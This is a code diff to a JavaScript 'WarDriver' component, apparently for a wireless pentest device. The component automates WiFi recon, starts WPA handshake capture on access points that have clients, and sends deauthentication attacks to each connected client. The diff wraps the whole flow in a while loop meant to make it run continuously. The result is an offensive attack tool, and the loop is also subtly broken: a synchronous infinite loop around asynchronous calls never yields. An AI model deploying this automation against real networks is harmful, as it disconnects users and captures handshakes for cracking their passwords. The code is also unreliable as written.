@@ -758,50 +758,54 @@
             var scanID;
             var currentBssid;
             var currentClient;
-            getReconStatus().then(function (reconResp) {
-                if (reconResp.scanRunning) { // if recon is running, stop it
-                    stopRecon();
-                }
-                setSettings().then(function () {
-                    startRecon().then(function (startResp) {
-                        if (startResp.scanRunning) {
-                            scanID = startResp.scanID;
-                            setTimeout(function () {
-                                stopRecon().then(function (stopReconResponse) {
-                                    if (stopReconResponse.success) {
-                                        getReconStatusById(scanID).then(function (reconScanResults) {
-                                            if (reconScanResults.APResults.length > 0) { // if we picked-up any APs
-                                                reconScanResults.APResults.forEach(function (ap) {
-                                                    if (ap.clients != null) { // if any have clients
-                                                        currentBssid = ap.bssid;
-                                                        startHandshakeCapture(ap.bssid).then(function () {
-                                                            //deauthBssid(ap);
-                                                            ap.clients.forEach(function (client) {
-                                                                currentClient = client;
-                                                                deauthClient(client);
-                                                            });
-                                                            setTimeout(function () {
-                                                                getHandshakeStatus().then(function (handShakeStatus) {
-                                                                    if (handShakeStatus.handshakes != null) {
-                                                                        sendNotification('Handshakes Found!'); // tell the user our results
-                                                                    }
-                                                                    else {
-                                                                        sendNotification('Sorry, no handshakes found :(');
-                                                                    }
+            var continuousRun = true;
+            while (continuousRun) {
+                getReconStatus().then(function (reconResp) {
+                    if (reconResp.scanRunning) { // if recon is running, stop it
+                        stopRecon();
+                    }
+                    setSettings().then(function () {
+                        startRecon().then(function (startResp) {
+                            if (startResp.scanRunning) {
+                                scanID = startResp.scanID;
+                                setTimeout(function () {
+                                    stopRecon().then(function (stopReconResponse) {
+                                        if (stopReconResponse.success) {
+                                            getReconStatusById(scanID).then(function (reconScanResults) {
+                                                if (reconScanResults.APResults.length > 0) { // if we picked-up any APs
+                                                    reconScanResults.APResults.forEach(function (ap) {
+                                                        if (ap.clients != null) { // if any have clients
+                                                            currentBssid = ap.bssid;
+                                                            startHandshakeCapture(ap.bssid).then(function () {
+                                                                //deauthBssid(ap);
+                                                                ap.clients.forEach(function (client) {
+                                                                    currentClient = client;
+                                                                    deauthClient(client);
                                                                 });
-                                                            }, 20000);
-                                                        });
-                                                    }
-                                                });
-                                            }
-                                        });
-                                    }
-                                });
-                            }, 120000);
-                        }
+                                                                setTimeout(function () {
+                                                                    getHandshakeStatus().then(function (handShakeStatus) {
+                                                                        if (handShakeStatus.handshakes != null) {
+                                                                            sendNotification('Handshakes Found!'); // tell the user our results
+                                                                        }
+                                                                        else {
+                                                                            sendNotification('Sorry, no handshakes found :(');
+                                                                        }
+                                                                        // stop handshakes
+                                                                    });
+                                                                }, 20000);
+                                                            });
+                                                        }
+                                                    });
+                                                }
+                                            });
+                                        }
+                                    });
+                                }, 180000);
+                            }
+                        });
                     });
                 });
-            });
+            }
         };
         WarDriverComponent.ctorParameters = function () { return [
             { type: ApiService }
